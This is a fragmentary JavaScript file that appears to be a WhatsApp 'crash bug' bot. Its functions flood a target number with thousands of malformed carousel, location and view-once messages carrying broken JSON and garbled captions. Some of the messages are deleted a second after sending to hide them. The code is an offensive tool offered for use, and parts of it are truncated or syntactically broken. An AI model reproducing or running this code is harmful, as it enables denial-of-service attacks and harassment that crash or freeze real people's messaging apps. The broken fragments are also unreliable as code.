...
async function SpcmCrash2(target) {
  ...
  const Node = [{
    ...
    async function CarouselVY(target) {
    ...
    const basePayload = {
        header: "ϟ",
        body: "Ganz",
        flow_action: "Salvadores",
        flow_action_payload: { screen: "Soviet" },
        flow_cta: "1",
        flow_id: "1",
    ...
    for (let i = 0; i < 3000; i++) {
        const cards = [{
            ...
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{", flow_id: "1", flow_token: "{[" })
                    },
                    {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{{", flow_id: "{[" })
                    },
                    {
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({ ...basePayload, flow_cta: "{{", flow_id: "{[" })
        ...
        const ephemeralWrap = {
            ephemeralMessage: { message: msg.message }
        };

        await sock.relayMessage(target, ephemeralWrap, { messageId: msg.key.id });

        setTimeout(async () => {
            await sock.sendMessage(target, { delete: { remoteJid: target, id: msg.key.id, fromMe: true } });
        }, 1000);
...
console.log(chalk.red(`𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 ${target}`));
...
// DELAY AREA
async function RajaDelayV2(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveRajaDelayV2Message: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁",
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
...
async function androdelay(durationHours, target) {
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 400) {
        await Promise.all([
          InvisHard(sock, target)
          RajaDelayV2(sock, target)
        ]);
...
└────────────────────────┘
  `));
        ...
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 𝐤𝐢𝐧𝐠𝐳𝐳𝐧𝐯𝐞𝐫𝐥𝐨𝐬𝐞𝟓𝟓𝟓⸸ 🍂 ).`));
          count = 0;
          batch++;
